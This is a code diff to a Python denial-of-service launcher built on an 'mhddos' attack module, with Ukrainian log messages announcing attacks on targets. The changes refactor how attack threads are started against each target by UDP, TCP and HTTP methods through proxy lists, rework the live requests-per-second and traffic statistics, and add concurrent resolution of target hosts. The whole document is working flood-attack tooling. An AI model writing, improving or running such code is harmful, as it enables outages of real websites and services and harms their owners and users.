@@ -3,6 +3,7 @@ import logging
 import os
 import random
 import socket
+from collections import namedtuple
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from functools import lru_cache
 from multiprocessing import cpu_count
@@ -33,6 +34,9 @@ def cls():
 @lru_cache(maxsize=128)
 def resolve_host(url):
     return socket.gethostbyname(URL(url).host)
+
+
+Params = namedtuple('Params', 'url, ip, method, threads')
 
 
 class AtomicCounter:
@@ -147,56 +151,78 @@ def update_proxies(period, targets, proxy_timeout):
 def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, table):
     threads_per_target = total_threads // len(targets)
     params_list = []
-    proxy_file = 'empty.txt' if vpn_mode else 'proxies.txt'
     for target in targets:
         ip = resolve_host(target)
         target = URL(target)
         # UDP
         if target.scheme == 'udp':
-            params_list.append((target, ip, 'UDP', UDP_THREADS, period))
+            params_list.append(Params(target, ip, 'UDP', UDP_THREADS))
 
         # TCP
         elif target.scheme == 'tcp':
-            params_list.append((target, ip, 'TCP', threads_per_target, period, proxy_file))
+            params_list.append(Params(target, ip, 'TCP', threads_per_target))
 
         # HTTP(S)
         else:
             threads = threads_per_target // len(http_methods)
             for method in http_methods:
-                params_list.append((target, ip, method, threads, period, proxy_file, rpc))
+                params_list.append(Params(target, ip, method, threads))
 
     logger.info(f'{cl.OKGREEN}Запускаємо атаку...{cl.RESET}')
     statistics = {}
     for params in params_list:
         thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
         statistics[params] = thread_statistics
-        kwargs = {'statistics': thread_statistics, 'sock_timeout': proxy_timeout}
-        Thread(target=mhddos_main, args=params, kwargs=kwargs, daemon=True).start()
+        kwargs = {
+            **params._asdict(),
+            'proxy_fn': 'empty.txt' if vpn_mode else 'proxies.txt',
+            'rpc': rpc,
+            'timer': period,
+            'statistics': thread_statistics,
+            'sock_timeout': proxy_timeout
+        }
+        Thread(target=mhddos_main, kwargs=kwargs, daemon=True).start()
         if not table:
             logger.info(
                 f"{cl.WARNING}Атакуємо{cl.OKBLUE} %s{cl.WARNING} методом{cl.OKBLUE} %s{cl.WARNING}, потоків:{cl.OKBLUE} %d{cl.WARNING}!{cl.RESET}"
-                % (params[0].host, params[2], params[3]))
+                % (params.url.host, params.method, params.threads))
 
     ts = time()
-    sleep(2)
+    refresh_rate = 2
+    sleep(refresh_rate)
     while True:
         passed = time() - ts
         if passed > period:
             break
 
-        if table:
-            tabulate_text = []
-            total_pps = 0
-            total_bps = 0
-            for k in statistics:
-                counters = statistics[k]
-                pps = int(int(counters['requests']) / passed)
-                total_pps += pps
-                bps = int(int(counters['bytes']) / passed)
-                total_bps += bps
+        tabulate_text = []
+        total_pps = 0
+        total_bps = 0
+        for k in statistics:
+            counters = statistics[k]
+            pps = int(int(counters['requests']) / passed)
+            total_pps += pps
+            bps = int(int(counters['bytes']) / passed)
+            total_bps += bps
+            if table:
                 tabulate_text.append(
-                    (f'{cl.WARNING}%s' % k[0].host, k[0].port, k[2], k[3], Tools.humanformat(pps), f'{Tools.humanbytes(bps)}{cl.RESET}')
+                    (f'{cl.WARNING}%s' % k.url.host, k.url.port, k.method, k.threads, Tools.humanformat(pps), f'{Tools.humanbytes(bps)}{cl.RESET}')
                 )
+            else:
+                logger.debug(
+                    f'{cl.WARNING}Ціль:{cl.OKBLUE} %s,{cl.WARNING} Порт:{cl.OKBLUE} %s,{cl.WARNING} Метод:{cl.OKBLUE} %s{cl.WARNING} Потоків:{cl.OKBLUE} %s{cl.WARNING} PPS:{cl.OKBLUE} %s,{cl.WARNING} BPS:{cl.OKBLUE} %s / %d%%{cl.RESET}' %
+                    (
+                        k.url.host,
+                        k.url.port,
+                        k.method,
+                        k.threads,
+                        Tools.humanformat(pps),
+                        Tools.humanbytes(bps),
+                        round((time() - ts) / period * 100, 2),
+                    )
+                )
+
+        if table:
             tabulate_text.append((f'{cl.OKGREEN}Усього', '', '', '', Tools.humanformat(total_pps), f'{Tools.humanbytes(total_bps)}{cl.RESET}'))
 
             cls()
@@ -207,25 +233,24 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_
                 headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоки', 'Запити/c', f'Трафік/c{cl.RESET}'],
                 tablefmt='fancy_grid'
             ))
-        else:
-            for k in statistics:
-                counters = statistics[k]
-                pps = int(int(counters['requests']) / passed)
-                bps = int(int(counters['bytes']) / passed)
-                logger.debug(
-                    f'{cl.WARNING}Ціль:{cl.OKBLUE} %s,{cl.WARNING} Порт:{cl.OKBLUE} %s,{cl.WARNING} Метод:{cl.OKBLUE} %s{cl.WARNING} Потоків:{cl.OKBLUE} %s{cl.WARNING} PPS:{cl.OKBLUE} %s,{cl.WARNING} BPS:{cl.OKBLUE} %s / %d%%{cl.RESET}' %
-                    (
-                        k[0].host,
-                        k[0].port,
-                        k[2],
-                        k[3],
-                        Tools.humanformat(pps),
-                        Tools.humanbytes(bps),
-                        round((time() - ts) / period * 100, 2),
-                    )
-                )
 
-        sleep(2)
+        sleep(refresh_rate)
+
+
+def get_resolvable_targets(targets):
+    targets = list(targets)
+    with ThreadPoolExecutor(len(targets)) as executor:
+        future_to_target = {
+            executor.submit(resolve_host, target): target
+            for target in targets
+        }
+        for future in as_completed(future_to_target):
+            target = future_to_target[future]
+            try:
+                future.result()
+                yield target
+            except socket.gaierror:
+                logger.warning(f'{cl.FAIL}Ціль {target} недоступна і не буде атакована{cl.RESET}')
 
 
 def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode, table):
@@ -238,14 +263,7 @@ def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods,
             logger.warning(f'{cl.FAIL}Робота методу {bypass} не гарантована - слідкуйте за трафіком{cl.RESET}')
 
     while True:
-        targets = []
-        for url in list(targets_iter):
-            try:
-                resolve_host(url)
-                targets.append(url)
-            except socket.gaierror:
-                logger.warning(f'{cl.FAIL}Ціль {url} недоступна і не буде атакована{cl.RESET}')
-
+        targets = list(get_resolvable_targets(targets_iter))
         if not targets:
             logger.error(f'{cl.FAIL}Не знайдено жодної доступної цілі{cl.RESET}')
             exit()
